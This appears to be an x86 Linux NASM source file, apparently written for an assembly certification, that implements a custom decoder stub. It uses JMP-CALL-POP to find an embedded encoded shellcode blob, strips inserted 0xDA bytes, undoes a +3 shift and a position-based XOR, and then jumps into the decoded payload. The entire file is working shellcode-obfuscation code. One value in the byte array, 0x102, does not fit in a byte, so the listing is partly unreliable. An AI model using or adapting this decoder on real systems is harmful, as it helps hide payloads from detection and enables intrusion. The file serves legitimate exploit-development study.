; Filename: Custom-Decoder.nasm
; Author:  David Alvarez Robles (km0xu95)
; Website:  https://blog.asturhackers.es
;
; Purpose: This assembly file has been created for completing the requirements of the SecurityTube Linux Assembly Expert (SLAE) certification

; Define entry point
global _start			

; Start text section
section .text
_start:
	jmp short load_shellcode	; Use JMP-CALL-POP method to retrieve EncodedShellcode address


; This procedure will prepare registers to perform decoding operations
start_decoder:
	pop esi			; Pop EncodedShellcode pointer from stack
	lea edi, [esi +1]	; Load in EDI register the value in ESI+1 position
	xor eax, eax		; Clear EAX register
	mov al, 1		; Initialize counter in EAX register
	xor ebx, ebx		; Clear EBX register


; This procedure will remove all the 0xDA bytes inserted by the encoder
remove_insertion: 
	mov bl, byte [esi + eax]	; Move to BL register byte value from ESI+EAX register
	xor bl, 0xda			; Compare with inserted byte
	jnz short ecx_initialize	; If comparison is not zero, the end of insertion removal is in place. Then jump to remove the sum done by the encoder
	mov bl, byte [esi + eax + 1]	; If comparison is zero, load in BL register value from ESI+EAX+1 (next byte) 
	mov byte [edi], bl		; Also move the byte to EDI register
	inc edi				; Increment EDI register by one
	add al, 2			; Move 2 bytes ahead
	jmp short remove_insertion	; Repeat the operation


;This procedure will re-initialize ECX register for loop counting
ecx_initialize:
	lea edi, [esi]		; Load in EDI register the value in ESI position
	xor ecx, ecx		; Clear ECX register
	mov cl, sclen		; Start loop counter

; This procedure will decrement results from insertion removal by 3 (remember that encoder performed +3 operation)
remove_sum_loop:
	sub byte [edi], 3	; Decrement by 3 value from byte on ESI register
	inc edi			; Jump to next byte
	loop remove_sum_loop	; Continue the loop operation
	jmp short remove_xor	; When loop is finished, jump to remove XOR operation


; This procedure will remove XOR operation performed by the encoder
remove_xor:
	lea edi, [esi]		; Load in EDI register the value in ESI position
	xor ecx, ecx		; Clear ECX register
	mov cl, sclen		; Start loop counter
	mov al, 1		; Initialize EAX register value on 1

remove_xor_loop:
	cmp byte [edi], AL	; Compare byte value with position
	jz xor_loop		; Jump if equal to loop in order to do not perform xor_operation
	xor byte [edi], AL	; Restore original value from shellcode doing xor operation

xor_loop:
	inc edi				; Jump to next byte
	inc eax				; Increment position
	loop remove_xor_loop		; Continue the loop operation
	jmp short EncodedShellcode	; When loop is finished, jump to remove XOR operation


; This procedure will be use in JMP-CALL-POP method
load_shellcode:
	call start_decoder	; Call starting procedure
	EncodedShellcode: db 0xed,0xda,0x1b,0xda,0x60,0xda,0x38,0xda,0xe1,0xda,0x91,0xda,0x5c,0xda,0x12,0xda,0x83,0xda,0x7f,0xda,0x06,0xda,0x88,0xda,0x56,0xda,0x05,0xda,0x85,0xda,0x11,0xda,0x9f,0xda,0x5f,0xda,0x1e,0xda,0x9c,0xda,0x46,0xda,0x1d,0xda,0x29,0xda,0xdb,0xda,0xac,0xda,0x14,0xda,0xd9,0xda,0x9f,0xda,0xf8,0xda,0x102,0xda,0xe3,0xda,0xe2,0xda,0xe1,0xda,0x10,0xda,0x44,0xda,0x50,0xda,0x4e,0xda,0x0c,0xda,0x57,0xda,0x43,0xda,0x6b,0xda,0x6b,0xda,0x6c,0xda,0x71,0xda,0x72,0xda,0x70,0xda,0x6f,0xda,0x76,0xda,0x75,0xda	; EncodedShellcode that must be changed
	sclen	equ  $-EncodedShellcode	; Store EncodedShellcode length
